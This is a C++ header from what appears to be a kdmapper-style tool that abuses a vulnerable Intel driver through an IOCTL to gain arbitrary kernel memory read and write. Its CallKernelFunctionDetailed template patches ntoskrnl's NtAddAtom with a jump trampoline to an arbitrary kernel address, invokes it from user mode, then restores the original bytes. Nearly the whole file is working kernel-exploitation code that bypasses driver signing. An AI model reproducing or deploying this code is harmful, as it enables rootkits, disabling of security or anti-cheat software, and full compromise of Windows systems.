#pragma once
#include <Windows.h>
#include <string>
#include <iostream>
#include <cstring>
#include <limits>
#include <mutex>
#include <optional>
#include <type_traits>


#include "utils.hpp"
#include "nt.hpp"

namespace intel_driver
{
	constexpr ULONG32 ioctl1 = 0x80862007;
	// Exact-image independent-page symbols were unavailable or invalid. The
	// helper is torn down before a mapped image can be created or stopped.
	constexpr NTSTATUS independent_page_symbols_unavailable_status = static_cast<NTSTATUS>(0xC0E30003u);
	extern HANDLE hDevice;
	extern ULONG64 ntoskrnlAddr;

	PVOID ResolveRelativeAddress(_In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize);
	NTSTATUS AcquireDebugPrivilege();

	uintptr_t FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask);
	uintptr_t FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size);
	uintptr_t FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask);

	bool IsRunning();
	// Called after the helper and ntoskrnl are available. The callback return
	// value is retained for source compatibility and is ignored.
	using symbol_provider = uint32_t(*)(void* context) noexcept;
	struct independent_page_rvas {
		uint32_t allocate = 0;
		uint32_t protect = 0;
		uint32_t free = 0;
	};
	namespace detail {
		enum class independent_page_api { allocate, protect, free };
		constexpr bool CompleteIndependentPageRvas(independent_page_rvas rvas) noexcept {
			return rvas.allocate && rvas.protect && rvas.free;
		}
		// No value means standalone callers may use the guarded signature path.
		// An engaged zero means strict callers must fail closed.
		constexpr std::optional<uint64_t> SelectIndependentPageTarget(
			bool exact_only, uint64_t image_base, independent_page_rvas rvas,
			independent_page_api api) noexcept {
			if (!exact_only) return std::nullopt;
			uint32_t rva = 0;
			switch (api) {
			case independent_page_api::allocate: rva = rvas.allocate; break;
			case independent_page_api::protect: rva = rvas.protect; break;
			case independent_page_api::free: rva = rvas.free; break;
			}
			if (!rva || !image_base ||
				image_base > (std::numeric_limits<uint64_t>::max)() - rva)
				return uint64_t{0};
			return image_base + rva;
		}
	}
	// A Load(provider, context) call requires all three addresses from a PDB
	// verified against the live ntoskrnl image. No signature fallback is used.
	bool ConfigureIndependentPageRvas(independent_page_rvas rvas);
	NTSTATUS Load();
	NTSTATUS Load(symbol_provider provider, void* context);
	NTSTATUS Unload();

	bool MemCopy(uint64_t destination, uint64_t source, uint64_t size);
	bool SetMemory(uint64_t address, uint32_t value, uint64_t size);
	bool GetPhysicalAddress(uint64_t address, uint64_t* out_physical_address);
	uint64_t MapIoSpace(uint64_t physical_address, uint32_t size);
	bool UnmapIoSpace(uint64_t address, uint32_t size);
	bool ReadMemory(uint64_t address, void* buffer, uint64_t size);
	bool WriteMemory(uint64_t address, void* buffer, uint64_t size);
	bool WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size);
	/*added by herooyyy*/
	uint64_t MmAllocateIndependentPagesEx(uint32_t size);
	bool MmFreeIndependentPages(uint64_t address, uint32_t size);
	struct kernel_call_result {
		// Set only after the target call has returned to this process.
		bool target_invoked = false;
		// True if the trampoline was untouched or its original bytes were read back.
		bool trampoline_intact = true;
		bool trampoline_restored = false;
	};
	struct kernel_allocation_result {
		uint64_t address = 0;
		kernel_call_result call{};
	};
	kernel_allocation_result MmAllocateIndependentPagesExDetailed(uint32_t size);
	kernel_call_result MmFreeIndependentPagesDetailed(uint64_t address, uint32_t size);
	BOOLEAN MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect);
	
	uint64_t AllocatePool(nt::POOL_TYPE pool_type, uint64_t size);
	kernel_allocation_result AllocatePoolDetailed(nt::POOL_TYPE pool_type, uint64_t size);

	bool FreePool(uint64_t address);
	kernel_call_result FreePoolDetailed(uint64_t address);
	uint64_t GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name);
	std::wstring GetDriverNameW();
	std::wstring GetDriverPath();
	std::mutex& KernelCallMutex();
	bool IsKernelCallTrampolineIntact();
	void MarkKernelCallTrampolineUnverified();
	bool RestoreKernelCallTrampoline(uint64_t address, const uint8_t* original, uint32_t size);

	template<typename T, typename ...A>
	kernel_call_result CallKernelFunctionDetailed(T* out_result, uint64_t kernel_function_address, const A ...arguments) {
		kernel_call_result outcome{};
		std::lock_guard<std::mutex> call_lock(KernelCallMutex());
		if (!IsKernelCallTrampolineIntact()) {
			outcome.trampoline_intact = false;
			return outcome;
		}
		constexpr auto call_void = std::is_same_v<T, void>;

		//if count of arguments is >4 fail
		static_assert(sizeof...(A) <= 4, "CallKernelFunction: Too many arguments, CallKernelFunction only can be called with 4 or less arguments");

		if constexpr (!call_void) {
			if (!out_result)
				return outcome;
		}
		else {
			UNREFERENCED_PARAMETER(out_result);
		}

		if (!kernel_function_address)
			return outcome;

		// Setup function call
		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
		if (ntdll == 0) {
			kdmLog(L"[-] Failed to load ntdll.dll" << std::endl); //never should happens
			return outcome;
		}

		const auto NtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
		if (!NtAddAtom)
		{
			kdmLog(L"[-] Failed to get export ntdll.NtAddAtom" << std::endl);
			return outcome;
		}

		uint8_t kernel_injected_jmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
		uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];
		std::memcpy(&kernel_injected_jmp[2], &kernel_function_address, sizeof(kernel_function_address));

		static uint64_t kernel_NtAddAtom = 0;
		if (!kernel_NtAddAtom)
			kernel_NtAddAtom = GetKernelModuleExport(intel_driver::ntoskrnlAddr, "NtAddAtom");
		if (!kernel_NtAddAtom) {
			kdmLog(L"[-] Failed to get export ntoskrnl.NtAddAtom" << std::endl);
			return outcome;
		}
		// The physical-write helper translates only the first page.
		if ((kernel_NtAddAtom & 0xfff) > 0x1000 - sizeof(kernel_injected_jmp))
			return outcome;

		if (!ReadMemory(kernel_NtAddAtom, &original_kernel_function, sizeof(kernel_injected_jmp)))
			return outcome;

		if (original_kernel_function[0] == kernel_injected_jmp[0] &&
			original_kernel_function[1] == kernel_injected_jmp[1] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 2] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 2] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 1] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 1]) {
			kdmLog(L"[-] FAILED!: The code was already hooked!! another instance of kdmapper running?!" << std::endl);
			MarkKernelCallTrampolineUnverified();
			outcome.trampoline_intact = false;
			return outcome;
		}

		// Overwrite the pointer with kernel_function_address
		if (!WriteToReadOnlyMemory(kernel_NtAddAtom, &kernel_injected_jmp, sizeof(kernel_injected_jmp))) {
			if (!RestoreKernelCallTrampoline(kernel_NtAddAtom, original_kernel_function, sizeof(original_kernel_function))) {
				MarkKernelCallTrampolineUnverified();
				outcome.trampoline_intact = false;
			}
			return outcome;
		}
		uint8_t patched_bytes[sizeof(kernel_injected_jmp)]{};
		if (!ReadMemory(kernel_NtAddAtom, patched_bytes, sizeof(patched_bytes)) ||
			std::memcmp(patched_bytes, kernel_injected_jmp, sizeof(patched_bytes)) != 0) {
			if (!RestoreKernelCallTrampoline(kernel_NtAddAtom, original_kernel_function, sizeof(original_kernel_function))) {
				MarkKernelCallTrampolineUnverified();
				outcome.trampoline_intact = false;
			}
			return outcome;
		}

		// Call function
		if constexpr (!call_void) {
			using FunctionFn = T(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

			*out_result = Function(arguments...);
		}
		else {
			using FunctionFn = void(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

			Function(arguments...);
		}
		outcome.target_invoked = true;

		// A reported write success is insufficient: read back the exact original
		// bytes before any caller may use another kernel-call trampoline.
		outcome.trampoline_restored = RestoreKernelCallTrampoline(
			kernel_NtAddAtom, original_kernel_function, sizeof(original_kernel_function));
		if (!outcome.trampoline_restored) {
			MarkKernelCallTrampolineUnverified();
			outcome.trampoline_intact = false;
		}
		return outcome;
	}

	template<typename T, typename ...A>
	bool CallKernelFunction(T* out_result, uint64_t kernel_function_address, const A ...arguments) {
		auto const result = CallKernelFunctionDetailed(out_result, kernel_function_address, arguments...);
		return result.target_invoked && result.trampoline_intact;
	}
}
